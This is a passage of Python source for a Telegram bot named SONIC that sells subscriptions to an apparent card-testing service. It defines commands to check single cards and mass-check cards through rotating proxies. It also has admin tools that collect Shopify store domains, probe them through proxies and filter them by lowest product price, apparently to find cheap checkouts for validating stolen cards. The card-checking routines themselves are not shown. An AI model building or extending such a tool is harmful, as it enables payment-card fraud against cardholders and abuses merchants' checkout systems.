    await event.reply("⭐ <b>SONIC Subscription</b>\n\nPay with Telegram Stars!\n\n• 1 Hour - 30⭐\n• 12 Hours - 50⭐\n• 1 Day - 100⭐\n• 3 Days - 250⭐\n• 1 Week - 500⭐\n\n👑 @ISoonik", parse_mode='html', buttons=get_sub_keyboard())

async def subscription_callback(event):
    data = event.data.decode()
    if data.startswith("sub_"):
        plan_key = data[4:]
        await send_star_invoice(event.sender_id, plan_key)
        await event.answer()
    elif data == "main_menu":
        await handle_menu_callback(event)

async def redeem(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
    if is_admin(user_id):
        await event.reply("👑 Admin")
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /redeem CODE")
        return
    success, msg = activate_code(user_id, args[1].strip().upper())
    await event.reply(msg)

# ==================== أوامر الأدمن ====================
async def admin_panel(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    await event.reply("👑 Admin Panel", buttons=get_admin_main_kb())

async def gencode(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    hours = 24
    if len(args) > 1:
        try:
            hours = int(args[1])
        except:
            pass
    code = create_activation_code(hours * 3600)
    await event.reply(f"✅ <code>{code}</code>\nDuration: {hours} hours", parse_mode='html')

async def users_list(event):
    if not is_admin(event.sender_id):
        return
    users = get_all_users()
    if not users:
        await event.reply("No users")
        return
    text = "<b>Users:</b>\n"
    for uid, data in list(users.items())[:50]:
        username = data.get('username', '?')
        active = "⭐" if data.get('subscription_expiry', 0) > time.time() else "❌"
        blocked = "🚫" if data.get('blocked') else "✅"
        text += f"<code>{uid}</code> | @{username} | {active} | {blocked}\n"
    await event.reply(text, parse_mode='html')

async def user_info(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ /user user_id")
        return
    uid = args[1]
    users = load_users()
    data = users.get(uid, {})
    expiry = data.get('subscription_expiry', 0)
    expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry > 0 else "None"
    await event.reply(f"<b>User {uid}</b>\n├ Username: @{data.get('username', '?')}\n├ Blocked: {data.get('blocked', False)}\n├ Premium: {data.get('premium', False)}\n├ Registered: {data.get('registered_at', '?')[:10]}\n└ Expires: {expiry_str}", parse_mode='html')

async def stats(event):
    if not is_admin(event.sender_id):
        return
    users = get_all_users()
    total = len(users)
    active = sum(1 for u in users.values() if u.get('subscription_expiry', 0) > time.time())
    blocked = sum(1 for u in users.values() if u.get('blocked', False))
    sites = len(load_sites())
    codes = len(load_codes())
    await event.reply(f"<b>📊 Stats</b>\n👥 Users: {total}\n⭐ Active: {active}\n🚫 Blocked: {blocked}\n🌐 Sites: {sites}\n🎫 Codes: {codes}", parse_mode='html')

# ==================== أوامر إدارة المواقع ====================
async def site_command(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /site domain.com")
        return
    site = args[1].replace('https://', '').replace('http://', '').rstrip('/')
    proxies = load_user_proxies(event.sender_id)
    if not proxies:
        await event.reply("❌ Add proxies first")
        return
    msg = await event.reply(f"🔄 Testing {site}...")
    is_shop, _ = await is_site_shopify(site, random.choice(proxies))
    if is_shop:
        sites = load_sites()
        if site in sites:
            await msg.edit(f"⚠️ Already exists: {site}")
        else:
            save_sites(sites + [site])
            await msg.edit(f"✅ Added: {site}")
    else:
        await msg.edit(f"❌ Not Shopify")

async def rmsite(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /rmsite domain.com")
        return
    site = args[1]
    sites = load_sites()
    if site not in sites:
        await event.reply(f"❌ Not found")
        return
    save_sites([s for s in sites if s != site])
    await event.reply(f"✅ Removed: {site}")

async def clearsites(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    count = len(load_sites())
    if count == 0:
        await event.reply("❌ No sites")
        return
    save_sites([])
    await event.reply(f"✅ Cleared {count} sites")

async def addsites(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    if not event.is_reply:
        await event.reply("❌ Reply to .txt file")
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply("❌ Reply to .txt file")
        return
    path = await reply.download_media()
    with open(path, 'r') as f:
        new_sites = [l.strip().replace('https://', '').replace('http://', '').rstrip('/') for l in f if l.strip()]
    os.remove(path)
    if not new_sites:
        await event.reply("❌ No sites")
        return
    user_pending_sites[event.sender_id] = {'action': 'add', 'sites': new_sites}
    await event.reply(f"💰 Filter {len(new_sites)} sites?", buttons=get_price_kb())

async def sitecheck(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    sites = load_sites()
    if not sites:
        await event.reply("❌ No sites")
        return
    user_pending_sites[event.sender_id] = {'action': 'check', 'sites': sites}
    await event.reply("💰 Select price filter:", buttons=get_price_kb())

async def price_filter(event):
    user_id = event.sender_id
    data = event.data.decode()
    if data == "price_cancel":
        if user_id in user_pending_sites:
            del user_pending_sites[user_id]
        await event.edit("Cancelled")
        return
    price_key = data.split("_")[1]
    pending = user_pending_sites.pop(user_id, None)
    if not pending:
        await event.edit("Session expired")
        return
    action = pending['action']
    sites = pending['sites']
    price_range = PRICE_RANGES.get(price_key, PRICE_RANGES["4"])
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.edit("❌ No proxies")
        return
    await event.edit(f"🔍 Checking {len(sites)} sites...")
    valid = []
    invalid = []
    proxy = random.choice(proxies)
    for site in sites:
        is_shop, _ = await is_site_shopify(site, proxy)
        if not is_shop:
            invalid.append(site)
            continue
        if price_range["min"] > 0 or price_range["max"] < 999999:
            price = await get_site_min_price(site, proxy)
            if price is not None and price > price_range["max"]:
                invalid.append(site)
                continue
        valid.append(site)
    if action == 'check':
        save_sites(valid)
        await event.edit(f"✅ Done!\nTotal: {len(sites)}\n✅ Valid: {len(valid)}\n❌ Removed: {len(invalid)}\n💰 Filter: {price_range['name']}")
    else:
        current = load_sites()
        new = [s for s in valid if s not in current]
        save_sites(list(set(current + valid)))
        await event.edit(f"✅ Added {len(new)} Shopify sites\nTotal: {len(load_sites())}")

async def mysites(event):
    if not is_admin(event.sender_id):
        await event.reply("❌ Admin only")
        return
    sites = load_sites()
    if not sites:
        await event.reply("📋 No sites")
        return
    text = "\n".join([f"• {s}" for s in sites])
    await event.reply(f"📋 <b>Sites ({len(sites)}):</b>\n\n{text}", parse_mode='html')

# ==================== المعالجات العامة ====================
async def handle_menu_callback(event):
    user_id = event.sender_id
    data = event.data.decode()
    if data == "show_commands":
        txt = """<b>📋 COMMANDS</b>
├ /start - Menu
├ /help - Help
├ /profile - Profile
├ /myproxy - Proxies
├ /proxy - Check proxies
├ /addproxy - Add proxies
├ /addproxies - Upload proxies
├ /chkproxy - Check one
├ /rmproxy - Remove
├ /clearproxy - Clear all
├ /getproxy - Get all
├ /cc - Check card
├ /chk - Mass check
└ /mcancel - Cancel

<b>⭐ SUBSCRIPTION</b>
├ /subscribe - Buy
└ /redeem CODE

👑 @ISoonik
📢 @ReGict7"""
        if is_admin(user_id):
            txt += "\n\n<b>👑 ADMIN</b>\n├ /admin\n├ /gencode\n├ /block\n├ /unblock\n├ /broadcast\n├ /addtime\n├ /users\n├ /user\n└ /stats"
        await event.edit(txt, buttons=get_back_keyboard(), parse_mode='html')
    elif data == "main_menu":
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
        text = await get_user_stats_text(user_id, username)
        await event.edit(text, buttons=get_main_keyboard(), parse_mode='html')

async def admin_callback(event):
    user_id = event.sender_id
    data = event.data.decode()
    if not is_admin(user_id):
        await event.answer("Admin only", alert=True)
        return
    if data == "admin_stats":
        users = get_all_users()
        total = len(users)
        active = sum(1 for u in users.values() if u.get('subscription_expiry', 0) > time.time())
        blocked = sum(1 for u in users.values() if u.get('blocked', False))
        sites = len(load_sites())
        codes = len(load_codes())
        await event.edit(f"<b>📊 Stats</b>\n👥 Users: {total}\n⭐ Active: {active}\n🚫 Blocked: {blocked}\n🌐 Sites: {sites}\n🎫 Codes: {codes}", parse_mode='html', buttons=get_admin_main_kb())
    elif data == "admin_broadcast":
        await event.edit("📢 Send broadcast message:", buttons=[[Button.inline("🔙 Back", b"admin_panel")]])
    elif data == "admin_block":
        await event.edit("🔨 Send user ID to block:", buttons=[[Button.inline("🔙 Back", b"admin_panel")]])
    elif data == "admin_unblock":
        await event.edit("🔓 Send user ID to unblock:", buttons=[[Button.inline("🔙 Back", b"admin_panel")]])
    elif data == "admin_add_time":
        await event.edit("📈 Send user_id hours (e.g. 123456789 24):", buttons=[[Button.inline("🔙 Back", b"admin_panel")]])
    elif data == "admin_sites":
        await event.edit("🌐 Site Management", buttons=get_admin_sites_kb())
    elif data == "admin_view_sites":
        sites = load_sites()
        if not sites:
            await event.edit("📋 No sites", buttons=get_admin_sites_kb())
        else:
            text = "\n".join([f"• {s}" for s in sites])
            await event.edit(f"📋 <b>Sites ({len(sites)}):</b>\n\n{text}", parse_mode='html', buttons=get_admin_sites_kb())
    elif data == "admin_add_site":
        await event.edit("➕ Send site domain:", buttons=[[Button.inline("🔙 Back", b"admin_sites")]])
    elif data == "admin_remove_site":
        sites = load_sites()
        if not sites:
            await event.edit("❌ No sites", buttons=get_admin_sites_kb())
        else:
            kb = [[Button.inline(s[:30], f"remove_{s}".encode())] for s in sites[:20]]
            kb.append([Button.inline("🔙 Back", b"admin_sites")])
            await event.edit("🗑️ Select site to remove:", buttons=kb)
    elif data == "admin_upload_sites":
        await event.edit("📁 Reply to a .txt file with sites:", buttons=[[Button.inline("🔙 Back", b"admin_sites")]])
    elif data == "admin_check_sites":
        sites = load_sites()
        if not sites:
            await event.edit("❌ No sites", buttons=get_admin_sites_kb())
        else:
            user_pending_sites[user_id] = {'action': 'check', 'sites': sites}
            await event.edit("💰 Select price filter:", buttons=get_price_kb())
    elif data == "admin_clear_sites":
        save_sites([])
        await event.edit("✅ All sites cleared!", buttons=get_admin_sites_kb())
    elif data == "admin_panel":
        await event.edit("👑 Admin Panel", buttons=get_admin_main_kb())
    elif data.startswith("remove_"):
        site = data[7:]
        sites = load_sites()
        if site in sites:
            save_sites([s for s in sites if s != site])
            await event.edit(f"✅ Removed: {site}", buttons=get_admin_sites_kb())
        else:
            await event.edit("❌ Not found", buttons=get_admin_sites_kb())

# ==================== معالجات النص للأدمن ====================
@bot.on(events.NewMessage(pattern='/broadcast', func=lambda e: is_admin(e.sender_id)))
async def broadcast_text(event):
    msg = event.text.replace('/broadcast', '').strip()
    if not msg:
        await event.reply("❌ /broadcast message")
        return
    users = get_all_users()
    sent = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), f"📢 <b>SONIC Broadcast</b>\n\n{msg}", parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await event.reply(f"✅ Sent to {sent}/{len(users)}")

@bot.on(events.NewMessage(pattern='/block', func=lambda e: is_admin(e.sender_id)))
async def block_text(event):
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ /block user_id")
        return
    try:
        uid = int(args[1])
        block_user(uid)
        await event.reply(f"✅ Blocked {uid}")
    except:
        await event.reply("❌ Invalid ID")

@bot.on(events.NewMessage(pattern='/unblock', func=lambda e: is_admin(e.sender_id)))
async def unblock_text(event):
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ /unblock user_id")
        return
    try:
        uid = int(args[1])
        unblock_user(uid)
        await event.reply(f"✅ Unblocked {uid}")
    except:
        await event.reply("❌ Invalid ID")

@bot.on(events.NewMessage(pattern='/addtime', func=lambda e: is_admin(e.sender_id)))
async def addtime_text(event):
    args = event.text.split()
    if len(args) < 3:
        await event.reply("❌ /addtime user_id hours")
        return
    try:
        uid = int(args[1])
        hours = int(args[2])
        seconds = hours * 3600
        users = load_users()
        uid_str = str(uid)
        if uid_str not in users:
            users[uid_str] = {}
        now = time.time()
        current = users[uid_str].get('subscription_expiry', 0)
        new_expiry = current + seconds if current > now else now + seconds
        users[uid_str]['subscription_expiry'] = new_expiry
        users[uid_str]['premium'] = True
        save_users(users)
        await event.reply(f"✅ Added {hours} hours to {uid}")
    except:
        await event.reply("❌ Invalid")

# ==================== التشغيل ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    
    # إضافة الأدمن
    for admin in ADMIN_IDS:
        users = load_users()
        if str(admin) not in users:
            users[str(admin)] = {'user_id': admin, 'username': 'admin', 'registered_at': datetime.now().isoformat(), 'subscription_expiry': time.time() + 999999999, 'premium': True, 'blocked': False}
            save_users(users)
    
    if not os.path.exists('sites.txt'):
        open('sites.txt', 'w').close()
    
    # تشغيل مهمة الدفع
    asyncio.create_task(check_payments())
    
    # تسجيل المعالجات
    bot.add_event_handler(start, events.NewMessage(pattern='/start'))
    bot.add_event_handler(help_command, events.NewMessage(pattern='/help'))
    bot.add_event_handler(profile, events.NewMessage(pattern='/profile'))
    bot.add_event_handler(myproxy, events.NewMessage(pattern='/myproxy'))
    bot.add_event_handler(addproxy, events.NewMessage(pattern='/addproxy'))
    bot.add_event_handler(addproxies, events.NewMessage(pattern='/addproxies'))
    bot.add_event_handler(chkproxy, events.NewMessage(pattern='/chkproxy'))
    bot.add_event_handler(rmproxy, events.NewMessage(pattern='/rmproxy'))
    bot.add_event_handler(clearproxy, events.NewMessage(pattern='/clearproxy'))
    bot.add_event_handler(proxy_check, events.NewMessage(pattern='/proxy'))
    bot.add_event_handler(getproxy, events.NewMessage(pattern='/getproxy'))
    bot.add_event_handler(mcancel, events.NewMessage(pattern='/mcancel'))
    bot.add_event_handler(single_cc, events.NewMessage(pattern='/cc'))
    bot.add_event_handler(mass_check, events.NewMessage(pattern='/chk'))
    bot.add_event_handler(subscribe, events.NewMessage(pattern='/subscribe'))
    bot.add_event_handler(redeem, events.NewMessage(pattern='/redeem'))
    bot.add_event_handler(admin_panel, events.NewMessage(pattern='/admin'))
    bot.add_event_handler(gencode, events.NewMessage(pattern='/gencode'))
    bot.add_event_handler(users_list, events.NewMessage(pattern='/users'))
    bot.add_event_handler(user_info, events.NewMessage(pattern='/user'))
    bot.add_event_handler(stats, events.NewMessage(pattern='/stats'))
    bot.add_event_handler(site_command, events.NewMessage(pattern='/site'))
    bot.add_event_handler(rmsite, events.NewMessage(pattern='/rmsite'))
    bot.add_event_handler(clearsites, events.NewMessage(pattern='/clearsites'))
    bot.add_event_handler(addsites, events.NewMessage(pattern='/addsites'))
    bot.add_event_handler(sitecheck, events.NewMessage(pattern='/sitecheck'))
    bot.add_event_handler(mysites, events.NewMessage(pattern='/mysites'))
    
    # معالجات الكيبورد
    bot.add_event_handler(handle_menu_callback, events.CallbackQuery(pattern=b"show_commands|main_menu"))
    bot.add_event_handler(subscription_callback, events.CallbackQuery(pattern=b"sub_"))
    bot.add_event_handler(mode_select, events.CallbackQuery(pattern=b"mode_"))
    bot.add_event_handler(control_callback, events.CallbackQuery(pattern=b"pause_|resume_|stop_"))
    bot.add_event_handler(admin_callback, events.CallbackQuery(pattern=b"admin_"))
    bot.add_event_handler(price_filter, events.CallbackQuery(pattern=b"price_"))
    
    print("=" * 50)
    print("✅ SONIC BOT STARTED (Telethon - Fixed)")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⭐ Plans: {len(STAR_PRICES)}")
    print(f"📊 Max cards per combo: {MAX_CARDS_PER_COMBO}")
    print("=" * 50)
    
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
